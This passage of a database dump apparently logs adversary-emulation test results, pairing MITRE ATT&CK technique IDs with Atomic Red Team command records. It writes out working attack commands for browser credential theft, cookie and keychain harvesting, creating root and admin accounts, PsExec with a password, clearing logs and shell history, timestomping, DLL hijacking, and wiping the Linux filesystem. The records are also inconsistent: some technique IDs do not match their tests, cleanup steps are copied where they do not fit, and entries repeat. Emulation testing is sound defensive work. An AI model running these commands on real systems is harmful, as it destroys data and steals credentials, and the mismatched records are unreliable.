/CACHE:No\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Add Network Share", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "share_name", "value": "\\\\\\\\test\\\\share"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["net share #{share_name} /delete\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Remove Network Share", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "share_name", "value": "\\\\\\\\test\\\\share"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["Remove-SmbShare -Name #{share_name}\\nRemove-FileShare -Name #{share_name}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Remove Network Share PowerShell", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "share_name", "value": "\\\\\\\\test\\\\share"}], "execution_status": "Pass"}]}}}}
306	\N		\N	yes	P2	\N	2021-07-30 02:26:33.48756+00	T1564.003	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "Remove-Item #{file_path}\\\\Sysinternals -Force -Recurse -ErrorAction Ignore", "command": ["cd ~/Library/Cookies\\ngrep -q \\"#{search_string}\\" \\"Cookies.binarycookies\\"\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Search macOS Safari Cookies", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "search_string", "value": "coinbase"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{file_path}\\\\Sysinternals -Force -Recurse -ErrorAction Ignore", "command": ["#{lazagne_path} browsers\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "LaZagne - Credentials from Browser", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{lazagne_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "lazagne_path", "value": "PathToAtomicsFolder\\\\T1555.003\\\\bin\\\\LaZagne.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["security -h\\nsecurity find-certificate -a -p > #{cert_export}\\nsecurity import #{cert_export} -k\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Keychain", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "cert_export", "value": "/tmp/certs.pem"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["Start-Process #{powershell_command}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Hidden Window", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "powershell_command", "value": "powershell.exe -WindowStyle hidden calc.exe"}], "execution_status": "Pass"}]}}}}
147	\N		\N	yes	P1	\N	2021-07-27 10:38:26.528399+00	T1546.007	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.007/T1546.007.md"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.468Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}], "atomicred": [{"cleanup": "", "command": ["netsh.exe add helper #{helper_file}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Netsh Helper DLL Registration", "created_date": "27/07/2021", "post_command": [], "modified_date": "27/07/2021", "pre-requisite": [], "input_arguments": [{"key": "helper_file", "value": "C:\\\\Path\\\\file.dll"}], "execution_status": "Pass"}]}}}}
241	\N		\N	yes	P2	\N	2021-07-30 03:14:24.860156+00	T1574.001	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "del /f cdpsgshims.dll", "command": ["net stop cdpsvc", "\\nnet start cdpsvc"], "executor": ["Cmd"], "platform": "Windows", "file_name": "cdpsgshims.dll", "pre_command": ["cp cdpsgshims.dll C:\\\\Windows\\\\System32"], "ability_name": "", "created_date": "28/06/2021", "post_command": ["whoami", "\\nnetstat -ano | findstr /i 1337", "\\nnc64.exe 127.0.0.1 1337", "\\nwhoami"], "modified_date": "28/06/2021", "pre-requisite": ["cdpsgshims.dll"], "input_arguments": [], "execution_status": "Pass"}], "atomicred": [{"cleanup": "Invoke-AtomicTest T1574.001 -Cleanup", "command": ["Invoke-AtomicTest T1574.001 -TestNumbers 1"], "executor": ["pwsh"], "platform": "Windows", "file_name": "T1574.001.yaml", "pre_command": ["Invoke-AtomicTest T1574.001 -CheckPrereqs"], "ability_name": "", "created_date": "28/06/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}, {"cleanup": "del %APPDATA%\\\\updater.exe >nul 2>&1\\ndel %APPDATA%\\\\amsi.dll >nul 2>&1\\n", "command": ["copy %windir%\\\\System32\\\\windowspowershell\\\\v1.0\\\\powershell.exe %APPDATA%\\\\updater.exe\\ncopy %windir%\\\\System32\\\\amsi.dll %APPDATA%\\\\amsi.dll\\n%APPDATA%\\\\updater.exe -Command exit\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "DLL Search Order Hijacking - amsi.dll", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}]}}}}
289	\N		\N	yes	P1	\N	2021-07-27 12:20:07.290186+00	T1569.002	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "del C:\\\\art-marker.txt >nul 2>&1\\n", "command": ["sc.exe create #{service_name} binPath= \\"#{executable_command}\\"\\nsc.exe start #{service_name}\\nsc.exe delete #{service_name}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Execute a Command as a Service", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "service_name", "value": "ARTService"}, {"key": "executable_command", "value": "%COMSPEC% /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\\\art-marker.txt"}], "execution_status": "Fail"}, {"cleanup": "NA", "command": ["#{psexec_exe} \\\\\\\\#{remote_host} -u #{user_name} -p #{password} -accepteula \\"C:\\\\Windows\\\\System32\\\\calc.exe\\"\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Use PsExec to execute a command on a remote host", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{psexec_exe}\\") { exit 0} else { exit 1}\\n"], "input_arguments": [{"key": "remote_host", "value": "localhost"}, {"key": "user_name", "value": "DOMAIN\\\\Administrator"}, {"key": "password", "value": "P@ssw0rd1"}, {"key": "psexec_exe", "value": "C:\\\\PSTools\\\\PsExec.exe"}], "execution_status": "Fail"}]}}}}
276	\N		\N	no	P1	\N	2021-07-27 10:33:12.481781+00	T1136.001	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "userdel #{username}\\n", "command": ["useradd -M -N -r -s /bin/bash -c evil_account #{username}\\n"], "executor": "bash", "platform": "linux", "file_name": "", "pre_command": [], "ability_name": "Create a user account on a Linux system", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "username", "value": "evil_user"}], "execution_status": "Pass"}, {"cleanup": "dscl . -delete /Users/#{username}\\n", "command": ["dscl . -create /Users/#{username}\\ndscl . -create /Users/#{username} UserShell /bin/zsh\\ndscl . -create /Users/#{username} RealName \\"#{realname}\\"\\ndscl . -create /Users/#{username} UniqueID \\"1010\\"\\ndscl . -create /Users/#{username} PrimaryGroupID 80\\ndscl . -create /Users/#{username} NFSHomeDirectory /Users/#{username}\\n"], "executor": "bash", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Create a user account on a MacOS system", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "username", "value": "evil_user"}, {"key": "realname", "value": "Evil Account"}], "execution_status": "Pass"}, {"cleanup": "net user /del \\"#{username}\\" >nul 2>&1\\n", "command": ["net user /add \\"#{username}\\" \\"#{password}\\"\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create a new user in a command prompt", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "username", "value": "T1136.001_CMD"}, {"key": "password", "value": "T1136.001_CMD!"}], "execution_status": "Pass"}, {"cleanup": "Remove-LocalUser -Name \\"#{username}\\" -ErrorAction Ignore\\n", "command": ["New-LocalUser -Name \\"#{username}\\" -NoPassword\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create a new user in PowerShell", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "username", "value": "T1136.001_PowerShell"}], "execution_status": "Pass"}, {"cleanup": "userdel #{username}\\n", "command": ["useradd -g 0 -M -d /root -s /bin/bash #{username}\\nif [ $(cat /etc/os-release | grep -i 'Name=\\"ubuntu\\"') ]; then echo \\"#{username}:#{password}\\" | sudo chpasswd; else echo \\"#{password}\\" | passwd --stdin #{username}; fi;\\n"], "executor": "bash", "platform": "linux", "file_name": "", "pre_command": [], "ability_name": "Create a new user in Linux with `root` UID and GID.", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "username", "value": "butter"}, {"key": "password", "value": "BetterWithButter"}], "execution_status": "Pass"}, {"cleanup": "net user /del \\"#{username}\\" >nul 2>&1\\n", "command": ["net user /add \\"#{username}\\" \\"#{password}\\"\\nnet localgroup administrators \\"#{username}\\" /add\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create a new Windows admin user", "created_date": "27/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "username", "value": "T1136.001_Admin"}, {"key": "password", "value": "T1136_pass"}], "execution_status": "Pass"}]}}}}
322	\N		\N	yes	P2	\N	2021-07-30 03:15:22.971462+00	T1574.002	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "fsutil usn createjournal m=1000 a=100 c:\\n", "command": ["fsutil usn deletejournal /D C:\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Indicator Removal using FSUtil", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["rm ~/.bash_history\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Clear Bash history (rm)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["echo \\"\\" > ~/.bash_history\\n"], "executor": "sh", "platform": "linux", "file_name": "", "pre_command": [], "ability_name": "Clear Bash history (echo)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["cat /dev/null > ~/.bash_history\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Clear Bash history (cat dev/null)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["ln -sf /dev/null ~/.bash_history\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Clear Bash history (ln dev/null)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["truncate -s0 ~/.bash_history\\n"], "executor": "sh", "platform": "linux", "file_name": "", "pre_command": [], "ability_name": "Clear Bash history (truncate)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["unset HISTFILE\\nexport HISTFILESIZE=0\\nhistory -c\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Clear history of a bunch of shells", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "sed -i 's/set +o history//g' ~/.bashrc\\n. ~/.bashrc\\nset -o history\\n", "command": ["set +o history\\necho 'set +o history' >> ~/.bashrc\\n. ~/.bashrc\\nhistory -c\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Clear and Disable Bash History Logging", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["hostname\\nwhoami\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Use Space Before Command to Avoid Logging to History", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "userdel -f testuser1\\n", "command": ["sshpass -p 'pwd101!' ssh testuser1@localhost -T hostname\\n"], "executor": "sh", "platform": "linux", "file_name": "", "pre_command": [], "ability_name": "Disable Bash History Logging with SSH -T", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["/usr/sbin/useradd testuser1\\necho pwd101! | passwd testuser1 --stdin\\n"], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["Set-PSReadlineOption HistorySaveStyle SaveNothing\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Prevent Powershell History Logging", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["Remove-Item (Get-PSReadlineOption).HistorySavePath\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Clear Powershell History by Deleting History File", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["rm -rf #{folder_to_delete}\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Delete an entire folder - Linux/macOS", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "folder_to_delete", "value": "/tmp/victim-files"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["shred -u #{file_to_shred}\\n"], "executor": "sh", "platform": "linux", "file_name": "", "pre_command": [], "ability_name": "Overwrite and delete a file with shred", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "file_to_shred", "value": "/tmp/victim-shred.txt"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["del /f #{file_to_delete}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Delete a single file - Windows cmd", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["IF EXIST \\"#{file_to_delete}\\" ( EXIT 0 ) ELSE ( EXIT 1 )\\n"], "input_arguments": [{"key": "file_to_delete", "value": "%temp%\\\\deleteme_T1551.004"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["rmdir /s /q #{folder_to_delete}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Delete an entire folder - Windows cmd", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["IF EXIST \\"#{folder_to_delete}\\" ( EXIT 0 ) ELSE ( EXIT 1 )\\n"], "input_arguments": [{"key": "folder_to_delete", "value": "%temp%\\\\deleteme_T1551.004"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["Remove-Item -path #{file_to_delete}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Delete a single file - Windows PowerShell", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{file_to_delete}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "file_to_delete", "value": "$env:TEMP\\\\deleteme_T1551.004"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["Remove-Item -Path #{folder_to_delete} -Recurse\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Delete an entire folder - Windows PowerShell", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{folder_to_delete}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "folder_to_delete", "value": "$env:TEMP\\\\deleteme_folder_T1551.004"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["rm -rf / --no-preserve-root > /dev/null 2> /dev/null\\n"], "executor": "bash", "platform": "linux", "file_name": "", "pre_command": [], "ability_name": "Delete Filesystem - Linux", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["Remove-Item -Path (Join-Path \\"$Env:SystemRoot\\\\prefetch\\\\\\" (Get-ChildItem -Path \\"$Env:SystemRoot\\\\prefetch\\\\*.pf\\" -Name)[0])\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Delete Prefetch File", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["Remove-Item #{teamviewer_log_file}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Delete TeamViewer Log Files", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{teamviewer_log_file}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "teamviewer_log_file", "value": "$env:TEMP\\\\TeamViewer_54.log"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["touch -m -t 197001010000.00 #{target_filename}\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Set a file's modification timestamp", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "target_filename", "value": "/opt/filename"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["NOW=$(date)\\ndate -s \\"1970-01-01 00:00:00\\"\\ntouch #{target_filename}\\ndate -s \\"$NOW\\"\\nstat #{target_filename}\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Set a file's creation timestamp", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "target_filename", "value": "/opt/filename"}], "execution_status": "Pass"}, {"cleanup": "Set-PSReadLineOption -HistorySaveStyle SaveIncrementally", "command": ["touch -acmr #{reference_file_path} #{target_file_path}\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Modify file timestamps using reference file", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "target_file_path", "value": "/opt/filename"}, {"key": "reference_file_path", "value": "/bin/sh"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{file_path} -Force -ErrorAction Ignore\\n", "command": ["Get-ChildItem #{file_path} | % { $_.CreationTime = \\"#{target_date_time}\\" }\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Windows - Modify file creation timestamp with PowerShell", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{file_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "target_date_time", "value": "01/01/1970 00:00:00"}, {"key": "file_path", "value": "$env:TEMP\\\\T1551.006_timestomp.txt"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{file_path} -Force -ErrorAction Ignore\\n", "command": ["Get-ChildItem #{file_path} | % { $_.LastWriteTime = \\"#{target_date_time}\\" }\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Windows - Modify file last modified timestamp with PowerShell", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{file_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "target_date_time", "value": "01/01/1970 00:00:00"}, {"key": "file_path", "value": "$env:TEMP\\\\T1551.006_timestomp.txt"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{file_path} -Force -ErrorAction Ignore\\n", "command": ["Get-ChildItem #{file_path} | % { $_.LastAccessTime = \\"#{target_date_time}\\" }\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Windows - Modify file last access timestamp with PowerShell", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{file_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "target_date_time", "value": "01/01/1970 00:00:00"}, {"key": "file_path", "value": "$env:TEMP\\\\T1551.006_timestomp.txt"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{file_path}\\\\timestomp.ps1 -ErrorAction Ignore\\nRemove-Item #{file_path}\\\\kxwn.lock -ErrorAction Ignore", "command": ["import-module #{file_path}\\\\timestomp.ps1\\ntimestomp -dest \\"#{file_path}\\\\kxwn.lock\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Windows - Timestomp a File", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path -path \\"#{file_path}\\\\kxwn.lock\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "file_path", "value": "$env:appdata\\\\Microsoft"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["net use c: #{share_name}\\nnet share test=#{share_name} /REMARK:\\"test share\\" /CACHE:No\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Add Network Share", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "share_name", "value": "\\\\\\\\test\\\\share"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["net share #{share_name} /delete\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Remove Network Share", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "share_name", "value": "\\\\\\\\test\\\\share"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["Remove-SmbShare -Name #{share_name}\\nRemove-FileShare -Name #{share_name}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Remove Network Share PowerShell", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "share_name", "value": "\\\\\\\\test\\\\share"}], "execution_status": "Pass"}, {"cleanup": "del %APPDATA%\\\\updater.exe >nul 2>&1\\ndel %APPDATA%\\\\amsi.dll >nul 2>&1\\n", "command": ["copy %windir%\\\\System32\\\\windowspowershell\\\\v1.0\\\\powershell.exe %APPDATA%\\\\updater.exe\\ncopy %windir%\\\\System32\\\\amsi.dll %APPDATA%\\\\amsi.dll\\n%APPDATA%\\\\updater.exe -Command exit\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "DLL Search Order Hijacking - amsi.dll", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "taskkill /F /IM #{process_name} >nul 2>&1\\n", "command": ["#{gup_executable}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "DLL Side-Loading using the Notepad++ GUP.exe binary", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{gup_executable}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "process_name", "value": "calculator.exe"}, {"key": "gup_executable", "value": "PathToAtomicsFolder\\\\T1574.002\\\\bin\\\\GUP.exe"}], "execution_status": "Pass"}]}}}}
37	\N		reg	yes	P1	\N	2021-07-27 11:08:24.21953+00	T1546.011	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["Windows Registry Editor Version 5.00\\n\\n[HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\AppCompatFlags\\\\InstalledSDB\\\\{5b8c1261-4f9b-43ca-b0fc-791ddf38d129}]\\n\\"DatabaseDescription\\"=\\"putty_dll_inject\\"\\n\\"DatabaseInstallTimestamp\\"=hex(b):9b,de,91,76,d5,76,00,00\\n\\"DatabasePath\\"=\\"C:\\\\\\\\windows\\\\\\\\AppPatch\\\\\\\\{5b8c1261-4f9b-43ca-b0fc-791ddf38d129}\\"\\n\\n\\n[HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\AppCompatFlags\\\\Custom\\\\putty.exe]\\n\\"{5b8c1261-4f9b-43ca-b0fc-791ddf38d129}\\"=hex(b):9b,de,91,76,d5,76,00,00"], "executor": [""], "platform": "", "file_name": "T1546_011.reg", "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:52.174Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}], "atomicred": [{"cleanup": "sdbinst.exe -u #{file_path} >nul 2>&1\\n", "command": ["sdbinst.exe #{file_path}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Application Shim Installation", "created_date": "27/07/2021", "post_command": [], "modified_date": "27/07/2021", "pre-requisite": ["if (Test-Path c:\\\\Tools\\\\AtomicTest.dll) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "file_path", "value": "PathToAtomicsFolder\\\\T1546.011\\\\bin\\\\AtomicShimx86.sdb"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item C:\\\\Windows\\\\apppatch\\\\Custom\\\\T1546.011CompatDatabase.sdb -ErrorAction Ignore\\nRemove-Item C:\\\\Windows\\\\apppatch\\\\Custom\\\\Custom64\\\\T1546.011CompatDatabase.sdb -ErrorAction Ignore\\n", "command": ["Copy-Item $PathToAtomicsFolder\\\\T1546.011\\\\bin\\\\T1546.011CompatDatabase.sdb C:\\\\Windows\\\\apppatch\\\\Custom\\\\T1546.011CompatDatabase.sdb\\nCopy-Item $PathToAtomicsFolder\\\\T1546.011\\\\bin\\\\T1546.011CompatDatabase.sdb C:\\\\Windows\\\\apppatch\\\\Custom\\\\Custom64\\\\T1546.011CompatDatabase.sdb\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "New shim database files created in the default shim database directory", "created_date": "27/07/2021", "post_command": [], "modified_date": "27/07/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Remove-ItemProperty -Path HKLM:\\"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\AppCompatFlags\\\\Custom\\" -Name \\"AtomicRedTeamT1546.011\\" -ErrorAction Ignore\\nRemove-ItemProperty -Path HKLM:\\"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\AppCompatFlags\\\\InstalledSDB\\" -Name \\"AtomicRedTeamT1546.011\\" -ErrorAction Ignore\\n", "command": ["New-ItemProperty -Path HKLM:\\"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\AppCompatFlags\\\\Custom\\" -Name \\"AtomicRedTeamT1546.011\\" -Value \\"AtomicRedTeamT1546.011\\"\\nNew-ItemProperty -Path HKLM:\\"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\AppCompatFlags\\\\InstalledSDB\\" -Name \\"AtomicRedTeamT1546.011\\" -Value \\"AtomicRedTeamT1546.011\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Registry key creation and/or modification events for SDB", "created_date": "27/07/2021", "post_command": [], "modified_date": "27/07/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}]}}}}
